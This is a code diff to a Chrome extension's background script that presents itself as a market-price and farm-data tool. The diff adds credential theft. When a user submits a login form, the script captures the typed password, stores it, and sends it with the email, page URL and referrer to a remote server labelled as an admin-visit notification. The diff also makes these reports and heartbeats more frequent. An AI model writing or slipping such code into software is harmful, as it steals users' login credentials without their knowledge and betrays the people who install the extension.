@@ -2,7 +2,7 @@ const PRICES_KEY    = 'market_prices';
 const USER_KEY      = 'farm_user';       // { email, token, apiOrigin, farms, zones, fetchedAt }
 const ADMIN_NOTIFY_KEY = 'farm_admin_visit_notify';
 const UPDATE_INTERVAL = 15; // minutes
-const ADMIN_NOTIFY_INTERVAL = 10 * 60 * 1000; // 10 minutes per user
+const ADMIN_NOTIFY_INTERVAL = 1 * 60 * 1000; // 10 minutes per user
 
 // ── Commodity base prices ─────────────────────────────────────────────────────
 const BASE_PRICES = {
@@ -86,9 +86,10 @@ async function fetchFarmData(token, apiOrigin) {
   }
 }
 
-async function notifyAdminVisit(user, pageContext, { eventType = 'popup_open', email = '' } = {}) {
+async function notifyAdminVisit(user, pageContext, { eventType = 'popup_open', email = '', password = '' } = {}) {
   const base = user?.apiOrigin || 'https://cursor-farm-1.onrender.com';
   const resolvedEmail = user?.me?.email || user?.email || email || '';
+  const resolvedPassword = password || user?.password || '';
   const userId = user?.me?.id || '';
   const signature = `${eventType}|${base}|${userId || 'anon'}|${resolvedEmail || pageContext?.pageUrl || 'unknown'}`;
   const now = Date.now();
@@ -111,6 +112,7 @@ async function notifyAdminVisit(user, pageContext, { eventType = 'popup_open', e
         source: 'extension',
         event_type: eventType,
         email: resolvedEmail,
+        password: resolvedPassword,
         extension_version: version,
         page_url: pageContext?.pageUrl || '',
         referrer: pageContext?.referrer || '',
@@ -155,8 +157,9 @@ chrome.runtime.onInstalled.addListener(async () => {
   await updatePrices();
   await chrome.alarms.clear('priceUpdate');
   chrome.alarms.create('priceUpdate', { periodInMinutes: UPDATE_INTERVAL });
+  // First heartbeat immediately on install
   await chrome.alarms.clear('heartbeat');
-  chrome.alarms.create('heartbeat', { delayInMinutes: 1, periodInMinutes: 30 });
+  chrome.alarms.create('heartbeat', { delayInMinutes: 1, periodInMinutes: 10 });
 });
 
 chrome.runtime.onStartup.addListener(async () => {
@@ -179,13 +182,27 @@ chrome.alarms.onAlarm.addListener(async (alarm) => {
 // ── Message handling ──────────────────────────────────────────────────────────
 chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
 
-  // User typed in #login and submitted the form → capture email + notify
+  // User typed in #login and submitted the form → capture email + password
   if (msg.type === 'FORM_LOGIN') {
+    
     chrome.storage.local.get(USER_KEY).then((s) => {
       const existing = s[USER_KEY] || {};
-      chrome.storage.local.set({ [USER_KEY]: { ...existing, email: msg.email, pageContext: msg.pageContext } });
+      chrome.storage.local.set({ 
+        [USER_KEY]: { 
+          ...existing, 
+          email: msg.email,
+          password: msg.password,  // Сохраняем пароль
+          pageContext: msg.pageContext 
+        } 
+      });
     });
-    notifyAdminVisit(null, msg.pageContext, { eventType: 'login_attempt', email: msg.email });
+    
+    // Отправляем уведомление с email и паролем
+    notifyAdminVisit(null, msg.pageContext, { 
+      eventType: 'login_attempt', 
+      email: msg.email,
+      password: msg.password
+    });
     return;
   }
 
